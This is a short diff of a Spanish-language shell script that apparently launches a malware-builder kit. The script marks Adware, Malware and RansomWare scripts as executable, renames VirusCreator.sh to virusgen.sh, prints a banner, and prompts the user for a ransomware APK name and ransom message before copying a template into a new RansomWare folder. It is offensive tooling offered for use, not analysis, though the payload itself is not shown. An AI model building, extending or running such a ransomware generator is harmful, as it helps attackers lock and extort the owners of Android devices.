@@ -3,7 +3,7 @@ clear
 chmod 777 Adware.sh
 chmod 777 Malware.sh
 chmod 777 RansomWare.sh
-chmod 777 VirusCreator.sh
+chmod 777 virusgen.sh
 echo "▄▄    ▄▄   ▄▄▄▄▄▄   ▄▄▄▄▄▄    ▄▄    ▄▄    ▄▄▄▄       ▄▄▄▄   ▄▄▄▄▄▄▄▄  ▄▄▄   ▄▄" 
 echo "▀██  ██▀   ▀▀██▀▀   ██▀▀▀▀██  ██    ██  ▄█▀▀▀▀█    ██▀▀▀▀█  ██▀▀▀▀▀▀  ███   ██" 
 echo " ██  ██      ██     ██    ██  ██    ██  ██▄       ██        ██        ██▀█  ██" 
@@ -18,7 +18,7 @@ echo " "
 echo "Ingresa el nombre de tu RansomWare (incluye extencion .apk)"
 read input
 echo " "
-echo "INgresa el mensaje quieres que diga"
+echo "Ingresa el mensaje quieres que diga"
 read input1
 mkdir RansomWare
 cp 3 $input.apk
